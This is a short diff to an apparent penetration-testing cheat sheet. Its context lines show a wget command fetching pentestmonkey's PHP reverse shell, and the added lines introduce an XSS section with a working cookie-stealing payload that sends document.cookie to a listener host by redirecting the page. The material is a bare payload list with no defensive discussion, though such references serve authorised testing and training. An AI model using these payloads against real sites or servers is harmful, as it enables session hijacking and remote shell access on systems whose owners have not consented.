@@ -151,6 +151,11 @@ Shell PHP
 ```
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
+## XSS
+
+```
+<script>document.location="http://127.0.0.1/value_cookie="+document.cookie</script>
+```
 
 ## LFI
 
